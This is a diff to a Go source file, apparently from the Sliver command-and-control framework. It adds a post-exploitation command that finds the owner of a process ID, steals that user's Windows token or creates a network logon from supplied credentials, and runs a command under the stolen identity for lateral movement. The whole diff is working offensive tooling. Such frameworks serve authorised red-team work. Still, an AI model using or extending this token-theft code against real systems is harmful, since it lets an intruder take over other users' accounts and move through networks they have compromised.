@@ -5,11 +5,17 @@ package privilege
 	Copyright (C) 2024  Bishop Fox / mgstate
 
 	Combined impersonate+action commands for faster lateral movement.
+	Supports:
+	  - Username + password: creates Type 9 logon (network creds)
+	  - Username only: steals existing logged-in user token
+	  - PID: resolves owner and steals token
+	  - -e flag: execute command immediately after impersonation
 */
 
 import (
 	"context"
 	"fmt"
+	"strconv"
 	"strings"
 
 	"github.com/spf13/cobra"
@@ -29,9 +35,45 @@ func ImpersonateAndExecCmd(cmd *cobra.Command, con *console.SliverClient, args [
 	password, _ := cmd.Flags().GetString("password")
 	domain, _ := cmd.Flags().GetString("domain")
 	execCmd, _ := cmd.Flags().GetString("exec")
+	pidStr, _ := cmd.Flags().GetString("pid")
+
+	// If PID provided, resolve to username first
+	if pidStr != "" {
+		pid, err := strconv.ParseInt(pidStr, 10, 32)
+		if err != nil {
+			con.PrintErrorf("Invalid PID: %s\n", pidStr)
+			return
+		}
+
+		psList, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
+			Request: con.ActiveTarget.Request(cmd),
+		})
+		if err != nil {
+			con.PrintErrorf("Failed to list processes: %s\n", err)
+			return
+		}
+
+		for _, proc := range psList.Processes {
+			if proc.Pid == int32(pid) {
+				owner := proc.Owner
+				// Strip domain prefix
+				if idx := strings.LastIndex(owner, "\\"); idx >= 0 {
+					username = owner[idx+1:]
+				} else {
+					username = owner
+				}
+				con.PrintInfof("PID %d -> %s (owner: %s)\n", pid, proc.Executable, owner)
+				break
+			}
+		}
+		if username == "" {
+			con.PrintErrorf("PID %d not found or no owner\n", pid)
+			return
+		}
+	}
 
 	if username == "" {
-		con.PrintErrorf("Must provide a username with -u\n")
+		con.PrintErrorf("Must provide -u <username> or -P <PID>\n")
 		return
 	}
 
@@ -64,13 +106,19 @@ func ImpersonateAndExecCmd(cmd *cobra.Command, con *console.SliverClient, args [
 			con.PrintErrorf("Token creation failed: %s\n", makeToken.Response.GetErr())
 			return
 		}
-		con.PrintInfof("Token created for %s\\%s\n", domain, username)
+		con.PrintInfof("Token created for %s\\%s (Type 9 - network creds)\n", domain, username)
 	} else {
 		// Step 1 alt: Impersonate existing logged-in user
+		ctrl := make(chan bool)
+		con.SpinUntil(fmt.Sprintf("Impersonating %s ...", username), ctrl)
+
 		impersonate, err := con.Rpc.Impersonate(context.Background(), &sliverpb.ImpersonateReq{
 			Request:  con.ActiveTarget.Request(cmd),
 			Username: username,
 		})
+		ctrl <- true
+		<-ctrl
+
 		if err != nil {
 			con.PrintErrorf("Impersonation failed: %s\n", err)
 			return
@@ -113,5 +161,7 @@ func ImpersonateAndExecCmd(cmd *cobra.Command, con *console.SliverClient, args [
 		if len(execResp.Stderr) > 0 {
 			con.PrintErrorf("%s\n", string(execResp.Stderr))
 		}
+	} else {
+		con.PrintInfof("Use 'whoami' to verify, 'rev2self' to revert\n")
 	}
 }
